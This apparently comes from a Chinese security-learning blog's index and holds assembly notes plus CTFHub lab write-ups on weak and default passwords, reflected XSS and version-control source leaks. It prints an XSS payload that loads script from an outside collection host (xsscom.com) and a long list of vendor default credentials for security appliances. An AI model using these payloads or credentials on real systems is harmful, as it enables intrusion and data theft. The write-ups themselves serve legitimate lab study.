如果将10000H-1FFFFH这段空间当作栈段，SS=1000H，栈空间为64KB，栈最底的字单元地址为1000:FFFE。任意时刻，SS:SP指向栈顶单元，当栈中只有一个元素的时候，SS=1000H，SP=FFFEH。栈为空，就相当于栈中唯一的元素出栈， 出栈后，SP=SP+2。 SP原来为FFFEH,加2后SP=0，所以，当栈为空的时候，SS=1000H， SP=0。 换一个角度看，任意时刻，SS:SP 指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈项元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的地址栈最底部的字单元的地址+2。栈最底部字单元的地址为1000:FFFE，所以栈空时，SP=0000H。 下载winXP，DEBUG使用的是十六进制。 详细使用可参考：https://www.cnblogs.com/tiger2soft/p/5094917.html ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:4:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x04 第一个程序 段名 segment 段名 ends segment和ends是成对使用的伪指令，功能是定义一个段，segment说明一个段的开始，ends说明一个段的结束。 end是一个汇编程序的结束标记，不同于ends。 assume的含义是“假设”，将特定用途的段和相关的段寄存器关联起来。 安装masm来对程序进行编程、编译、连接、跟踪。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:5:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x05 [BX]和loop指令 loop指令的格式是：loop标号，CPU执行loop指令时，要执行两步操作，1、(cx)=(cx)-1；2、判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。 在汇编源程序中，数据不能以字母开头。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:6:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x06 包含多个段的程序 “dw”的含义是定义字型数据。dw即“define word”。 在单任务系统中，可执行文件中的程序执行过程如下。 （1）由其他的程序（Debug、command或其他程序）将可执行文件中的程序加载入内存 （2）设置CS:IP指向程序的第一条要执行的指令（即程序的入口），从而使程序得以运行。 （3）程序运行结束后，返回到加载者。 “assume cs:code,ds:data,ss:stack\"将cs、ds和ss分别和code、data、stack段相连。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:7:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x07 更灵活的定位内存地址的方法 用’…..‘的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。 [bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata si和di是8086CPU中和bx功能相近的寄存器，si和di不能分成两个8位寄存器来使用。 寻址方式 （1）[idata]用一个常量来表示地址，用于直接定位一个内存单元。 （2）[bx]用一个变量来表示内存地址，可用于间接定位一个内存单元。 （3）[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元。 （4）[bx+si]用两个变量表示地址。 （5）[bx+si+idata]用两个变量和一个常量表示地址。 一般来说，在需要暂存数据的时候，我们都应该使用栈。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:8:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x08 数据处理的两个基本问题 reg的集合包括：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di； sreg的集合包括：ds、ss、cs、es。 在8086CPU中，只有bx、si、di和dp可以用在”[….]“中来进行内存单元寻址。 在[…]中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si、bx和di、bp和si、bp和di。 只要在[…]中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中。 div做除法时的注意事项: (1)除数:有8位和16位两种，在一个reg或内存单元中。 (2)被除数:默认放在AX或DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放;如果除数为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。 (3) 结果:如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数;如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。 dup的使用格式如下： db 重复次数 dup （重复的字节型数据） dw 重复次数 dup （重复的字型数据） dd 重复次数 dup （重复的双字型数据） ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:9:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x09 转移指令的原理 短转移IP的修改范围为-128-127 近转移IP的修改范围为-32768-32767 操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。 jmp short 标号（转到标号处执行指令），实现段内的短转移，功能为(IP)=(IP)+8位位移。 CPU在执行jmp指令的时候并不需要转移的目的地址。 jmp near ptr 标号，实现的是段内近转移，功能为(IP)=(IP)+16位位移。 “jmp far ptr 标号\"实现的是段间转移，又称远转移。 “jcxz 标号\"的功能相当于：if((cx)==0) jmp short 标号; ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:10:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x0A CALL和RET指令 ret指令用栈中的数据，修好IP的内容，从而实现近转移。 retf指令用栈中的数据，修好CS和IP的内容，从而实现远转移。 CPU执行call指令时，进行两步操作： （1）将当前的IP或CS和IP压入栈中； （2）转移。 call 标号（将当前的IP压栈后，转到标号处执行指令） CPU执行此种格式call指令时，进行两步操作： （1）(sp)=(sp)-2 ((ss)*16+(sp))=(IP) （2）(IP)=(IP)+16位位移 call far ptr 标号，实现的是段间转移。 CPU执行此种格式call指令时，进行两步操作： （1）(sp)=(sp)-2 ((ss)*16+(sp))=(CS) (sp)=(sp)-2 ((ss)*16+(sp))=(IP) （2）(CS)=标号所在段的段地址 (IP)=标号所在段中的偏移地址 使用mul做乘法的时候，注意以下两点： （1）两个相乘的数：两个相乘的数，要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字节单元中； （2）结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认放在DX中，低位在AX中。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:11:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习"],"content":"0x0B 标志寄存器 CF和OF的区别：CF是对无符号数运算有意义的标志位，而OF是对有符号数运算有意义的标志位。 adc是带进位的加法指令，利用了CF上记录的进位值。 指令格式：adc 操作对象1 操作对象2 功能：操作对象1=操作对象1+操作对象2+CF 如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位值。 sbb是带借位的减法指令，利用了CF上记录的借位值。 指令格式：sbb 操作对象1 操作对象2 功能：操作对象1=操作对象1-操作对象2-CF cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。其他相关指令通过识别这些被影响的标志寄存器位来得知比较结果。 DF在串处理指令中，控制每次操作后si、di的增减。 df=0 每次操作后si、di递增；df=1 每次操作后si、di递减。 ","date":"2021-03-01","objectID":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/:12:0","tags":["逆向"],"title":"《汇编语言》学习笔记(updating)","uri":"/2021-03-01-%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0updating/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-02-28","objectID":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/:0:0","tags":["Web安全","CTF"],"title":"CTFHub-密码口令+XSS","uri":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/"},{"categories":["学习","安全技术"],"content":"0x00 前言 菜鸡记录汇总下密码口令+XSS的学习过程。 ","date":"2021-02-28","objectID":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/:1:0","tags":["Web安全","CTF"],"title":"CTFHub-密码口令+XSS","uri":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/"},{"categories":["学习","安全技术"],"content":"0x01 弱口令 题目：通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 简单试了下admin/123456就解出来了，这道题应该是使用bp的intruder模块进行字典的爆破。 ","date":"2021-02-28","objectID":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/:2:0","tags":["Web安全","CTF"],"title":"CTFHub-密码口令+XSS","uri":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/"},{"categories":["学习","安全技术"],"content":"0x02 默认口令 根据提示搜索默认用户名和密码。\r\u003cstrong\u003e常见的网络安全设备默认密码：\u003c/strong\u003e\r设备 默认账号 默认密码\r深信服产品 sangfor/sangfor|sangfor@2018|sangfor@2019\r深信服科技 AD dlanrecover\r深信服负载均衡 AD 3.6 admin/admin\r深信服WAC ( WNS V2.6) admin/admin\r深信服VPN Admin/Admin\r深信服ipsec-VPN (SSL 5.5) Admin/Admin\r深信服AC6.0 admin/admin\rSANGFOR防火墙 admin/sangfor\r深信服AF(NGAF V2.2) admin/sangfor\r深信服NGAF下一代应用防火墙(NGAF V4.3) admin/admin\r深信服AD3.9 admin/admin\r深信服上网行为管理设备数据中心 Admin/密码为空\rSANGFOR_AD_v5.1 admin/admin\r网御漏洞扫描系统 leadsec/leadsec\r天阗入侵检测与管理系统 V7.0 Admin/venus70\rAudit/venus70\radm/venus70\r天阗入侵检测与管理系统 V6.0 Admin/venus60\rAudit/venus60\radm/venus60\r网御WAF集中控制中心(V3.0R5.0) admin/leadsec.waf\raudit/leadsec.waf\radm/leadsec.waf\r联想网御 administrator/administrator\r网御事件服务器 admin/dmin123\r联想网御防火墙PowerV administrator/administrator\r联想网御入侵检测系统 lenovo/default\r网络卫士入侵检测系统 admin/talent\r网御入侵检测系统V3.2.72.0 adm/leadsec32\radmin/leadsec32\r联想网御入侵检测系统IDS root/111111\radmin/admin123\r科来网络回溯分析系统 csadmin/colasoft\r中控考勤机web3.0 administrator/123456\rH3C iMC admin/admin\rH3C SecPath系列 admin/admin\rH3C S5120-SI test/123\rH3C智能管理中心 admin/admin\rH3C ER3100 admin/adminer3100\rH3C ER3200 admin/adminer3200\rH3C ER3260 admin/adminer3260\rH3C admin/adminer\radmin/admin\radmin/h3capadmin\rh3c/h3c\r360天擎 admin/admin\r网神防火墙 firewall/firewall\r天融信防火墙NGFW4000 superman/talent\r黑盾防火墙 admin/admin\rrule/abc123\raudit/abc123\r华为防火墙 telnetuser/telnetpwd\rftpuser/ftppwd\r方正防火墙 admin/admin\r飞塔防火墙 admin/密码为空\rJuniper_SSG__5防火墙 netscreen/netscreen\r中新金盾硬件防火墙 admin/123\rkill防火墙(冠群金辰) admin/sys123\r天清汉马USG防火墙 admin/venus.fw\rAudit/venus.audit\ruseradmin/venus.user\r阿姆瑞特防火墙 admin/manager\r山石网科 hillstone/hillstone\r绿盟安全审计系统 weboper/weboper\rwebaudit/webaudit\rconadmin/conadmin\radmin/admin\rshell/shell\r绿盟产品 admin/nsfocus123\radmin/Nsf0cus!@#\radmin/nsf0cus.\radmin/Nsf0cus!@\rTopAudit日志审计系统 superman/talent\rLogBase日志管理综合审计系统 admin/safetybase\r网神SecFox运维安全管理与审计系统 admin/!1fw@2soc#3vpn\r天融信数据库审计系统 superman/telent\rHillstone安全审计平台 hillstone/hillstone\r网康日志中心 ns25000/ns25000\r网络安全审计系统（中科新业） admin/123456\r天玥网络安全审计系统 Admin/cyberaudit\r明御WEB应用防火墙 admin/admin\radmin/adminadmin\r明御攻防实验室平台 root/123456\r明御安全网关 admin/adminadmin\r明御运维审计与册风险控制系统 admin/1q2w3e\rsystem/1q2w3e4r\rauditor/1q2w3e4r\roperator/1q2w3e4r\r明御网站卫士 sysmanager/sysmanager888\r亿邮邮件网关 eyouuser/eyou_admin\reyougw/admin@(eyou)\radmin/+-ccccc\radmin/cyouadmin\rWebsense邮件安全网关 administrator/admin\r梭子鱼邮件存储网关 admin/admin\r尝试后得出flag。\r","date":"2021-02-28","objectID":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/:3:0","tags":["Web安全","CTF"],"title":"CTFHub-密码口令+XSS","uri":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/"},{"categories":["学习","安全技术"],"content":"0x03 反射型 先在第一个输入\u003cscript\u003ealert('hannibal')\u003c/script\u003e，发现存在xss漏洞。 第二个输入框输入URL，尝试使用XSS Platform 这里选择默认即可。 然后，选中\u003c/textarea\u003e'\"\u003e\u003cscript src=http://xsscom.com//MwHaMs\u003e\u003c/script\u003e 首先在第一个输入框输入\u003cscript src=http://xsscom.com//MwHaMs\u003e\u003c/script\u003e，然后再把submit后的url输入第二个输入框中。在XSS Platform中找到flag的信息。 ","date":"2021-02-28","objectID":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/:4:0","tags":["Web安全","CTF"],"title":"CTFHub-密码口令+XSS","uri":"/2021-02-28-ctfhub-%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4xss/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:0:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x00 前言 菜鸡记录汇总下信息泄露的学习过程。 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:1:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x01 目录遍历 在页面可以遍历到目录 一个个点开，最后发现 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:2:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x02 PHPINFO 点击后搜索关键字 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:3:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x03 网站源码 题目：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。 使用DirBuster设置后缀和文件名 发现存在www.zip文件 下载文件 解压后发现可疑文件，打开后没有flag 换种思路，网页上访问。 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:4:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x04 bak文件 题目：当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。 根据提示访问index.php.bak 得到flag ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:5:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x05 vim缓存 题目：当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。 Vim 的交换文件 .filename.swp，默认交换文件在打开文件的时候就会产生交换文件，正常退出的时候才会删除。 Vim 的备份文件 filename~，默认关闭，需要通过设置 set backup 来开启，Unbuntu的Vim配置文件是 /etc/vim/vimrc，开启后，对文件进行修改后会保存修改之前的一个副本。 打开文件 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:6:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x06 .DS_Store 题目：.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 下载.DS_Store 发现提示有flag的文件 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:7:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x07 Log 题目：当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 使用dirsearch工具进行目录扫描，执行dirsearch.py -u http://challenge-6ef911625ae64cdf.sandbox.ctfhub.com:10800/ -e *，注意url包含冒号，无法创建文件，可以通过-o指定outputfile文件的路径，或者修改在default.conf的[reports] autosave-report = False。 使用GitHack进行文件恢复 进入dist目录中的刚恢复的文件内打开git，题目提示log，联想到git log，查看历史提交记录。发现有个add flag的版本。 使用git reset [HEAD] ，回退版本 发现dist文件夹中多出了可疑文件，打开得到flag。 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:8:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x08 Stash 题目：同上 使用dirsearch扫描，再重复用GitHack来clone源码。 使用git stash show显示做了哪些改动，或者git stash list查看stash了哪些存储 刚好只有一个文件改动过，使用git stash show -p :，显示第一个存储的改动，成功得到flag。如果想显示其他存存储，命令：git stash show stash@{$num} -p ，比如第二个：git stash show\u0026nbsp;stash@{1}\u0026nbsp;-p 另一种解法：执行 git stash pop 发现从 git 栈中弹出来一个包含flag的文件。 第三种解法：使用cat .git/refs/stash打开stash文件，然后执行git diff比较工作区和暂存区 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:9:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x09 Index 题目：同上 clone源码，ls发现可疑文件，查看得到flag ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:10:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x0A SVN泄露 题目：当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。 在管理员使用SVN管理本地代码，并在发布代码时没有使用到处功能，直接使用了全选+复制+粘贴这种操作的话，就会将自动生成的 .svn 隐藏文件同时上传，而此文件中会有源码信息以及文件目录。 使用dirmap扫描隐藏文件 发现存在了 .svn 文件，手动访问.svn/entries和.svn/wc.db均能成功下载 可以使用svn-extractor下载文件，但output不支持冒号，在源代码中加入replace(\":\", \"\")后才能正常运行。 也可以直接使用svnExploit 使用 Navicat Premium 打开 wc.db 文件，储存的为某一版本的文件目录，REPOSITORY表里存储了svn的项目路径，在NODES 表发现可疑文件，local_relpath是原始文件名。 checksum栏里的$sha1$后面的那串数字的前两位对应pristine文件夹里的00~ff文件名，index.html对应的是bf。 再通过PRISTINE表中的checksum，推断出flag文件的名称为75。 但url直接访问无法获取txt，通过dvcs-ripper获取 .svn 文件来得到文件的源码备份信息，从而查看此txt文件的内容。 查看隐藏文件 pristine文件夹下会储存旧版本的备份信息，故进行访问查看 发现目标文件夹 查看flag文件 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:11:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":["学习","安全技术"],"content":"0x0B HG泄露 题目：当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。 使用dvcs-ripper来获取.hg文件，执行./rip-hg.pl -v -u http://challenge-be1484acebe78833.sandbox.ctfhub.com:10800/.hg/执行过程中发现可疑文件 下载完成后cd到.hg文件夹，执行grep -r flag * 确认后url访问，get flag。 ","date":"2021-02-26","objectID":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/:12:0","tags":["Web安全","CTF"],"title":"CTFHub-信息泄露","uri":"/2021-02-26-ctfhub-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"},{"categories":null,"content":"\r","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:0:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x00 hash还原 开局一张图，看这加密方式感觉像是md5。将0cc175b9c0f1b6a831c399e269772661进行MD5解密，得到a，确认加密方法后，找到一个类似的WP，下面开始爆破。 脚本如下： from string import ascii_letters,digits\rimport hashlib\rimport itertools\rflag= '7e76d39945'\rd=ascii_letters+digits\rdic=itertools.product(d,repeat=4)\rfor i in dic:\rres=hashlib.md5(''.join(i)).hexdigest()\rif res[0:10]==flag:\rprint i\rprint res\r","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:1:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x01 大明湖 发现图片属性中有一串16进制的数字。 解出压缩包的密码，打开key即可得到flag。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:2:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x02 画图 打开文件，发现一堆255的数值，结合题目画图，想到用像素点画图。 导出数值，编写代码： from PIL import Image\rx = 173\ry = 173\rim = Image.new(\"RGB\",(x,y))#创建图片\rfile = open('t.txt') #打开rbg值文件\r#通过一个个rgb点生成图片\rfor i in range(0,x):\rfor j in range(0,y):\rline = file.readline()#获取一行\rrgb = line.split(\" \")#分离rgb\rim.putpixel((i,j),(int(rgb[2]),int(rgb[3]),int(rgb[4])))#rgb转化为像素\rim.show()\r","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:3:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x03 回忆童年 binwalk发现图片内部有压缩包文件，foremost出来，在010下发现文件头异常。 修改后缀，得到图片，tips说答案为动漫的名字。 最后flag试了很久，龙珠、Dragonball，但万万忘记了拼音qilongzhu，根据图片是倒过来的，那么将答案也倒过来，uhzgnoliq。 ","date":"2021-02-16","objectID":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/:4:0","tags":null,"title":"凌虚平台CTF训练营（加密解密+隐写+取证）","uri":"/2021-02-16-%E5%87%8C%E8%99%9A%E5%B9%B3%E5%8F%B0ctf%E8%AE%AD%E7%BB%83%E8%90%A5%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E9%9A%90%E5%86%99%E5%8F%96%E8%AF%81/"},{"categories":null,"content":"0x04 损坏的二维码 可以看到上面两个定位符和右下方的点本该是正方形但变成了矩形。 利用画图工具修改。 